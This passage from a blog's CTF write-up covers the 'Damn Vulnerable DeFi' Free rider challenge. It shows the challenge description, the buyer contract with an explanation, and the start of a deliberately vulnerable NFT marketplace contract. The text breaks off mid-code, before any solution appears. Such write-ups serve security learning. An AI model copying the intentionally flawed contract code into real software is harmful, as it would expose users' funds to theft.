<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>Damn Vulnerable DeFi - Challenge #10 - Free rider - della&#39;s blog</title><meta name="Description" content="della&#39;s blog"><meta property="og:title" content="Damn Vulnerable DeFi - Challenge #10 - Free rider" />
<meta property="og:description" content="Solution for &ldquo;Damn Vulnerable DeFi - Challenge #10 - Free rider&rdquo;." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://dellalibera.github.io/posts/damnvulnerabledefi_10_free-rider/" /><meta property="og:image" content="https://dellalibera.github.io"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-10-17T00:00:00+00:00" />
<meta property="article:modified_time" content="2022-10-17T00:00:00+00:00" /><meta property="og:site_name" content="della&#39;s blog" />

<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://dellalibera.github.io"/>

<meta name="twitter:title" content="Damn Vulnerable DeFi - Challenge #10 - Free rider"/>
<meta name="twitter:description" content="Solution for &ldquo;Damn Vulnerable DeFi - Challenge #10 - Free rider&rdquo;."/>
<meta name="application-name" content="della&#39;s blog">
<meta name="apple-mobile-web-app-title" content="della&#39;s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://dellalibera.github.io/posts/damnvulnerabledefi_10_free-rider/" /><link rel="prev" href="https://dellalibera.github.io/posts/damnvulnerabledefi_09_puppetv2/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "Damn Vulnerable DeFi - Challenge #10 - Free rider",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/dellalibera.github.io\/posts\/damnvulnerabledefi_10_free-rider\/"
        },"genre": "posts","keywords": "Damn Vulnerable DeFi, CTF, Solidity, Blockchain","wordcount":  1577 ,
        "url": "https:\/\/dellalibera.github.io\/posts\/damnvulnerabledefi_10_free-rider\/","datePublished": "2022-10-17T00:00:00+00:00","dateModified": "2022-10-17T00:00:00+00:00","publisher": {
            "@type": "Organization",
            "name": ""},"author": {
                "@type": "Person",
                "name": "della"
            },"description": ""
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="della&#39;s blog">della&#39;s blog</a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/"> Home </a><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/advisories/"> Advisories </a><a class="menu-item" href="/about/"> About </a>
            </div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="della&#39;s blog">della&#39;s blog</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><a class="menu-item" href="/" title="">Home</a><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/advisories/" title="">Advisories</a><a class="menu-item" href="/about/" title="">About</a></div>
    </div>
</header><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title">Damn Vulnerable DeFi - Challenge #10 - Free rider</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="https://dellalibera.github.io/about/" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>della</a></span>&nbsp;<span class="post-category">included in <a href="/categories/writeup/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Writeup</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="October 17, 2022">October 17, 2022</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1577 words&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;8 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#1-challenge">1) Challenge</a></li>
    <li><a href="#2-code-review">2) Code Review</a></li>
    <li><a href="#3-solution">3) Solution</a></li>
    <li><a href="#4-references">4) References</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><div id="id-1">Solution for &ldquo;Damn Vulnerable DeFi - Challenge #10 - Free rider&rdquo;.</div>
<h2 id="1-challenge">1) Challenge</h2>
<div class="details admonition quote open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-quote-right fa-fw" aria-hidden="true"></i>Description<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><p>A new marketplace of Damn Valuable NFTs has been released! There&rsquo;s been an initial mint of 6 NFTs, which are available for sale in the marketplace. Each one at 15 ETH.</p>
<p>A buyer has shared with you a secret alpha: the marketplace is vulnerable and all tokens can be taken. Yet the buyer doesn&rsquo;t know how to do it. So it&rsquo;s offering a payout of 45 ETH for whoever is willing to take the NFTs out and send them their way.</p>
<p>You want to build some rep with this buyer, so you&rsquo;ve agreed with the plan.</p>
<p>Sadly you only have 0.5 ETH in balance. If only there was a place where you could get free ETH, at least for an instant.(<a href="https://www.damnvulnerabledefi.xyz/challenges/10.html" target="_blank" rel="noopener noreffer ">link</a>)</p>
</div>
        </div>
    </div>
<p>Challenge created by <a href="https://twitter.com/tinchoabbate" target="_blank" rel="noopener noreffer ">@tinchoabbate</a>.</p>
<h2 id="2-code-review">2) Code Review</h2>
<p>For this challenge, we have two contracts: <code>FreeRiderBuyer</code> (<a href="https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.2.0/contracts/free-rider/FreeRiderBuyer.sol" target="_blank" rel="noopener noreffer ">source code</a>) and <code>FreeRiderNFTMarketplace</code> (<a href="https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.2.0/contracts/free-rider/FreeRiderNFTMarketplace.sol" target="_blank" rel="noopener noreffer ">source code</a>).</p>
<p><code>FreeRiderBuyer</code>:
<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#00f">contract</span> <span style="color:#000">FreeRiderBuyer</span> <span style="color:#00f">is</span> <span style="color:#000">ReentrancyGuard</span>, <span style="color:#000">IERC721Receiver</span> {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#00f">using</span> <span style="color:#000">Address</span> <span style="color:#00f">for</span> <span style="color:#00f">address</span> <span style="color:#00f">payable</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#00f">address</span> <span style="color:#00f">private</span> <span style="color:#00f">immutable</span> <span style="color:#000">partner</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#000">IERC721</span> <span style="color:#00f">private</span> <span style="color:#00f">immutable</span> <span style="color:#000">nft</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#00f">uint256</span> <span style="color:#00f">private</span> <span style="color:#00f">constant</span> <span style="color:#000">JOB_PAYOUT</span> = <span style="color:#3af">45</span> <span style="color:#00f">ether</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#00f">uint256</span> <span style="color:#00f">private</span> <span style="color:#000">received</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#00f">constructor</span>(<span style="color:#00f">address</span> <span style="color:#000">_partner</span>, <span style="color:#00f">address</span> <span style="color:#000">_nft</span>) <span style="color:#00f">payable</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#000">require</span>(<span style="color:#000">msg</span>.<span style="color:#000">value</span> == <span style="color:#000">JOB_PAYOUT</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#000">partner</span> = <span style="color:#000">_partner</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#000">nft</span> = <span style="color:#000">IERC721</span>(<span style="color:#000">_nft</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#000">IERC721</span>(<span style="color:#000">_nft</span>).<span style="color:#000">setApprovalForAll</span>(<span style="color:#000">msg</span>.<span style="color:#000">sender</span>, <span style="color:#00f">true</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#888;font-style:italic">// Read https://eips.ethereum.org/EIPS/eip-721 for more info on this function
</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span>    <span style="color:#00f">function</span> <span style="color:#000">onERC721Received</span>(
</span></span><span style="display:flex;"><span>        <span style="color:#00f">address</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#00f">address</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#00f">uint256</span> <span style="color:#000">_tokenId</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#00f">bytes</span> <span style="color:#00f">memory</span>
</span></span><span style="display:flex;"><span>    ) 
</span></span><span style="display:flex;"><span>        <span style="color:#00f">external</span>
</span></span><span style="display:flex;"><span>        <span style="color:#00f">override</span>
</span></span><span style="display:flex;"><span>        <span style="color:#000">nonReentrant</span>
</span></span><span style="display:flex;"><span>        <span style="color:#00f">returns</span> (<span style="color:#00f">bytes4</span>) 
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#000">require</span>(<span style="color:#000">msg</span>.<span style="color:#000">sender</span> == <span style="color:#00f">address</span>(<span style="color:#000">nft</span>));
</span></span><span style="display:flex;"><span>        <span style="color:#000">require</span>(<span style="color:#000">tx</span>.<span style="color:#000">origin</span> == <span style="color:#000">partner</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#000">require</span>(<span style="color:#000">_tokenId</span> &gt;= <span style="color:#3af">0</span> &amp;&amp; <span style="color:#000">_tokenId</span> &lt;= <span style="color:#3af">5</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#000">require</span>(<span style="color:#000">nft</span>.<span style="color:#000">ownerOf</span>(<span style="color:#000">_tokenId</span>) == <span style="color:#00f">address</span>(<span style="color:#000">this</span>));
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#000">received</span>++;
</span></span><span style="display:flex;"><span>        <span style="color:#00f">if</span>(<span style="color:#000">received</span> == <span style="color:#3af">6</span>) {            
</span></span><span style="display:flex;"><span>            <span style="color:#00f">payable</span>(<span style="color:#000">partner</span>).<span style="color:#000">sendValue</span>(<span style="color:#000">JOB_PAYOUT</span>);
</span></span><span style="display:flex;"><span>        }            
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#00f">return</span> <span style="color:#000">IERC721Receiver</span>.<span style="color:#000">onERC721Received</span>.<span style="color:#000">selector</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}</span></span></code></pre></td></tr></table>
</div>
</div></p>
<p>This contract is responsible for implementing the buyer role in our challenge. It sets the attacker address as the partner (line <code>23</code>) and implements the <code>onERC721Received</code> function to receive NFT that:</p>
<ul>
<li>checks if the sender is the NFT token contract (line <code>40</code>)</li>
<li>checks if the <code>tx.origin</code> is the attacker address (line <code>41</code>)</li>
<li>checks if the token ID is between 0 and 5 (line <code>43</code>)</li>
<li>check if the owner of the token received is the contract (line <code>44</code>)</li>
<li>finally, after it receives <code>6</code> tickets, it sends <code>45 ETH</code> to the attacker address (lines <code>46-48</code>)</li>
</ul>
<p><code>FreeRiderNFTMarketplace</code>:
<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">62
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">63
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">64
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">65
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">66
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">67
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">68
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">69
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">70
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">71
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">72
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">73
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">74
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">75
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">76
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">77
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">78
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">79
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">80
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">81
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">82
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">83
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">84
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">85
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">86
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#00f">contract</span> <span style="color:#000">FreeRiderNFTMarketplace</span> <span style="color:#00f">is</span> <span style="color:#000">ReentrancyGuard</span> {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#00f">using</span> <span style="color:#000">Address</span> <span style="color:#00f">for</span> <span style="color:#00f">address</span> <span style="color:#00f">payable</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#000">DamnValuableNFT</span> <span style="color:#00f">public</span> <span style="color:#000">token</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#00f">uint256</span> <span style="color:#00f">public</span> <span style="color:#000">amountOfOffers</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#888;font-style:italic">// tokenId -&gt; price
</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span>    <span style="color:#00f">mapping</span>(<span style="color:#00f">uint256</span> =&gt; <span style="color:#00f">uint256</span>) <span style="color:#00f">private</span> <span style="color:#000">offers</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#00f">event</span> <span style="color:#000">NFTOffered</span>(<span style="color:#00f">address</span> <span style="color:#00f">indexed</span> <span style="color:#000">offerer</span>, <span style="color:#00f">uint256</span> <span style="color:#000">tokenId</span>, <span style="color:#00f">uint256</span> <span style="color:#000">price</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#00f">event</span> <span style="color:#000">NFTBought</span>(<span style="color:#00f">address</span> <span style="color:#00f">indexed</span> <span style="color:#000">buyer</span>, <span style="color:#00f">uint256</span> <span style="color:#000">tokenId</span>, <span style="color:#00f">uint256</span> <span style="color:#000">price</span>);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#00f">constructor</span>(<span style="color:#00f">uint8</span> <span style="color:#000">amountToMint</span>) <span style="color:#00f">payable</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#000">require</span>(<span style="color:#000">amountToMint</span> &lt; <span style="color:#3af">256</span>, <span style="color:#5a2">&#34;Cannot mint that many tokens&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#000">token</span> = <span style="color:#00f">new</span> <span style="color:#000">DamnValuableNFT</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#00f">for</span>(<span style="color:#00f">uint8</span> <span style="color:#000">i</span> = <span style="color:#3af">0</span>; <span style="color:#000">i</span> &lt; <span style="color:#000">amountToMint</span>; <span style="color:#000">i</span>++) {
